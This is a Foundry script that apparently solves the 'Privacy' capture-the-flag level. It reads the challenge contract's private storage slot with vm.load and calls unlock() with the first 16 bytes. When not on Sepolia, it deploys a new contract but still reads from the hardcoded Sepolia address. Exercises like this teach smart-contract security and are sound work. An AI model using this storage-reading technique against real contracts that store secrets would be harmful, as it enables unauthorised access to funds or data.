// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy public privacy;

    function run() external{
        console.log("Solving Privacy...");

        uint256 id;
        assembly {
            id := chainid()
        }
        if (id == 11155111) {
            privacy = Privacy(0x590A3B7a061A35876C102894c965ED19A7E88aB5);
        } else {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            privacy = new Privacy([bytes32(uint256(10)), bytes32(uint256(20)), bytes32(uint256(30))]);
            vm.stopBroadcast();
        }
        bytes32 data = vm.load(0x590A3B7a061A35876C102894c965ED19A7E88aB5, bytes32(uint256(5)));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        privacy.unlock(bytes16(data));
        vm.stopBroadcast();
        require(privacy.locked() == false);
        console.log("Privacy Solved!");
    }
}